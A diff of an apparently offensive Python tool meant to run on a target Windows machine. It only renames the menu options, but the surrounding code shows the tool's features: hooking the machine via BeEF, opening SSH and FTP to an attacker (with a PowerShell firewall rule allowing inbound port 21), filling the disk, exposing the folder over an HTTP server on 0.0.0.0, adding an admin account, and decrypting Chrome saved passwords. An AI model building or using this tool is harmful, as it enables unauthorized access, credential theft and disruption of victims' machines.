@@ -120,31 +120,31 @@ print(" ")
 print("Welcome, ")
 while True:
     print("Choose your action: ")
-    print("0) Print current machine scan outcome (only usable after action 1)") 
+    print("result) Print current machine scan outcome (only usable after action 1)") 
     sleep(0.1) 
     print("")
     sleep(0.1)
-    print("1) Scan this machine")
+    print("scan) Scan this machine")
     sleep(0.1)
-    print("2) Attempt to hook this machine via BeEF")
+    print("hook) Attempt to hook this machine via BeEF")
     sleep(0.1)
-    print("3) Attempt a local SSH connection")
+    print("ssh) Attempt a local SSH connection")
     sleep(0.1)
-    print("4) Attempt a FTP connection")
+    print("ftp) Attempt a FTP connection")
     sleep(0.1)
-    print("5) Check IP connectivity and response")
+    print("ping) Check IP connectivity and response")
     sleep(0.1)
-    print("6) Run diskfiller to fill up disk space")
+    print("DiskFill) Run diskfiller to fill up disk space")
     sleep(0.1)
-    print("7) Localy host a disk of the target machine")
+    print("DiskHost) Localy host a disk of the target machine")
     sleep(0.1)
-    print("8) Generate a new admin account on target machine")
+    print("AddAdmin) Generate a new admin account on target machine")
     sleep(0.1)
-    print("9) Export browser saved passwords (Chrome only)")
+    print("PassExport) Export browser saved passwords (Chrome only)")
     sleep(0.1)
     print(" ")
     sleep(0.1)
-    print("99) To exit the program")
+    print("exit) To exit the program")
     sleep(0.1)
     print(" ")
     sleep(0.1)
@@ -176,28 +176,28 @@ while True:
         print(Fore.YELLOW + "Choose action manual: ")
         print(" ")
         sleep(0.1)
-        print("0) Print current machine scan outcome (only usable after action 1)") 
+        print("result) Print current machine scan outcome (only usable after action 1)") 
         sleep(0.1)
-        print("1) Scans this machine: OS, network name, machine type, platform info, local IP address")
+        print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address")
         sleep(0.1)
-        print("2) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
+        print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
         sleep(0.1)
-        print("3) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
+        print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
         sleep(0.1)
-        print("4) Attempt a FTP connection: requires FTP server running on attacker machine")
+        print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine")
         sleep(0.1)
-        print("5) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
+        print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
         sleep(0.1)
-        print("6) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine")
+        print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine")
         sleep(0.1)
-        print("7) Localy host a disk of the target machine: hosts current folder via python http server on port 8100")
+        print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100")
         sleep(0.1)
-        print("8) Generate a new admin account on target machine")
+        print("AddAdmin) Generate a new admin account on target machine")
         sleep(0.1)
-        print("9) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
+        print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
         sleep(0.1)
         print(" ")
-        print("99) To exit the program")
+        print("exit) To exit the program")
         input("Press Enter to continue...")
 
 #
@@ -215,9 +215,9 @@ while True:
 #
 #
 
-#Action 0 = Printing the outcome of the scan
-    if action == "0":
-        logging.info(f"Chosen action 0 to print system information")
+#Action result = Printing the outcome of the scan
+    if action == "result":
+        logging.info(f"Chosen action result to print system information")
         if scanverify == "yes":
            info()
            logging.info(f"System info printed out")
@@ -247,7 +247,7 @@ while True:
 #
 
 #action 1 = scanning the machine
-    if action == "1":
+    if action == "scan":
         logging.info(f"Chosen action 1 to scan the machine")
         scanverify = "yes"
         cls()
@@ -327,9 +327,9 @@ while True:
 #
 #
 
-#Action 2 = beef hook
-    if action == "2":
-        logging.info(f"Chosen action 2 to attempt beef hook")
+#Action hook = beef hook
+    if action == "hook":
+        logging.info(f"Chosen action hook to attempt beef hook")
         pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
         sleep(0.1)
         while True:
@@ -367,9 +367,9 @@ while True:
 #
 #
 
-#Action 3 = local SSH connection
-    if action == "3":
-        logging.info(f"Chosen action 3 to attempt local SSH connection")
+#Action ssh = local SSH connection
+    if action == "ssh":
+        logging.info(f"Chosen action ssh to attempt local SSH connection")
         print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
         while True:
             attackerscriptcontinue=input("Continue? y/n: ")
@@ -460,9 +460,9 @@ while True:
 #
 #
 #
-#Action 4 = FTP connection
-    if action == "4":
-        logging.info(f"Chosen action 4 to attempt FTP connection")
+#Action ftp = FTP connection
+    if action == "ftp":
+        logging.info(f"Chosen action ftp to attempt FTP connection")
         fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
         run_ps(fwr21)
         ftpuser=input("Enter attacker user: ")
@@ -484,9 +484,9 @@ while True:
 #
 #
 #
-#Action 5 = pinging target IP
-    if action == "5":
-        logging.info(f"Chosen action 5 to check IP connectivity and response")
+#Action ping = pinging target IP
+    if action == "ping":
+        logging.info(f"Chosen action ping to check IP connectivity and response")
         targetip=input("Enter target IP to ping: ")
         subprocess.run(["ping", targetip])
         logging.info(f"Pinging the target machine")
@@ -505,9 +505,9 @@ while True:
 #
 #
 #
-#Action 6 = filling up disk space
-    if action == "6":
-        logging.info(f"Chose action 6 to fill a target computer disk")
+#Action DiskFiller = filling up disk space
+    if action == "DiskFill":
+        logging.info(f"Chose action DiskFill to fill a target computer disk")
         usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
         if usermovefile == "y":
             pathtodiskfiller=input("Enter path to diskfiller.bat (example d:\\filler\\diskfiller.bat), will be in the same folder as this program: ")
@@ -531,9 +531,9 @@ while True:
 #
 #
 #
-#Action 7 = hosting target disk on local network
-    if action == "7":
-        logging.info(f"Chosen action 7 to host target disk onto a local network")
+#Action DiskHoster = hosting target disk on local network
+    if action == "DiskHost":
+        logging.info(f"Chosen action DiskHost to host target disk onto a local network")
         hostdisk="python -m http.server 8100 --bind 0.0.0.0"
         run_ps(hostdisk)
 
@@ -557,9 +557,9 @@ while True:
 #
 #
 #
-#Action 8 = creating new admin account on target machine
-    if action =="8":
-        logging.info(f"Chosen action 8 to generate a new admin account on target machine")
+#Action AddAdmin = creating new admin account on target machine
+    if action =="AddAdmin":
+        logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
         newadminuser=input("Enter new admin username: ")
         sleep(0.1)
         newadminpass=input("Enter new admin password: ")
@@ -586,9 +586,9 @@ while True:
 #
 #
 #
-#Action 9 = retrieving Chrome saved passwords
-    if action == "9":
-        logging.info(f"Chosen action 9 to retrieve Chrome browsing history")
+#Action PassExport = retrieving Chrome saved passwords
+    if action == "PassExport":
+        logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
         
         # Check if we're on Windows
         if platform.system() != "Windows":
@@ -841,9 +841,9 @@ while True:
 #
 #
 
-#Action 99 = exiting the program
-    if action == "99":
-        logging.info(f"Chosen action 99 to exit the program")
+#Action exit = exiting the program
+    if action == "exit":
+        logging.info(f"Chosen action PassExport to exit the program")
         print("Exiting the program...")
         sleep(3)
 
